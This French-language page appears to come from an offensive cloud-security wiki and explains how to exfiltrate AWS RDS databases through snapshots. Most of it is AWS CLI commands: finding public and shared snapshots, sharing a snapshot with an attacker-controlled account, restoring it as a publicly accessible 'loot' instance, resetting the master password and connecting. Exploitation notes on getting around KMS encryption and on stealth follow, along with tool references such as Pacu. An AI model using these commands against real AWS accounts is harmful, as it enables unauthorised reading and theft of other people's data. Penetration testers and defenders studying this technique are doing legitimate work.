---
title: "Snapshots : lire une base de données hors ligne via un snapshot partagé ou public"
order: 1
description: "Partager ou copier des snapshots RDS et les restaurer dans une instance de l'attaquant pour lire la base de données hors ligne."
keywords:
  - RDS
  - snapshot
  - restauration
  - public
  - récupération de données
---

# Snapshots

Un snapshot RDS est une copie complète de la base de données. Avec `rds:ModifyDBSnapshotAttribute`, vous pouvez partager un snapshot avec un compte que vous contrôlez (ou avec tout le monde), puis le restaurer dans votre propre instance et lire chaque ligne, contournant entièrement les contrôles réseau et d'authentification de l'instance source. Même sans droits de partage, un snapshot existant restauré sur place donne une seconde instance dont vous définissez le mot de passe maître.

## Trouver et partager des snapshots

```bash
aws rds describe-db-snapshots --query 'DBSnapshots[].DBSnapshotIdentifier'
aws rds describe-db-snapshots --snapshot-type public        # already-public snapshots
aws rds describe-db-snapshots --snapshot-type shared        # shared with you

# share a snapshot with an attacker-controlled account
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier <snap> \
  --attribute-name restore --values-to-add <attacker-acct-id>
```

## Restaurer et lire

```bash
# in the account the snapshot is shared into, restore to a new instance you control
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier loot --db-snapshot-identifier <snap-arn> \
  --publicly-accessible
# then set a master password you know and connect
aws rds modify-db-instance --db-instance-identifier loot \
  --master-user-password 'Newpass123!' --apply-immediately
mysql -h <loot-endpoint> -u admin -p   # or psql for Postgres/Aurora
```

## Notes d'exploitation

- Partager un snapshot chiffré avec la clé KMS par défaut échoue ; le snapshot doit être copié vers une clé que vous pouvez partager, ou être non chiffré, ce qui restreint la voie sans la fermer.
- Les snapshots publics à travers le compte sont un gain rapide : `describe-db-snapshots --snapshot-type public` avec un filtre de compte trouve des données exposées par erreur.
- Restaurer sur place est plus bruyant (une nouvelle instance apparaît) mais ne nécessite aucune relation de confiance inter-comptes.

## Outils

- **AWS CLI** (`rds modify-db-snapshot-attribute`, `restore-db-instance-from-db-snapshot`).
- **Pacu** (`rds__explore_snapshots`) : automatise la copie, la restauration et la lecture.

## Références

- [AWS: sharing a DB snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ShareSnapshot.html)
- [Rhino Security Labs: RDS snapshot exfiltration](https://rhinosecuritylabs.com/aws/exploiting-aws-iam-permissions-rds/)
- [Pacu: AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
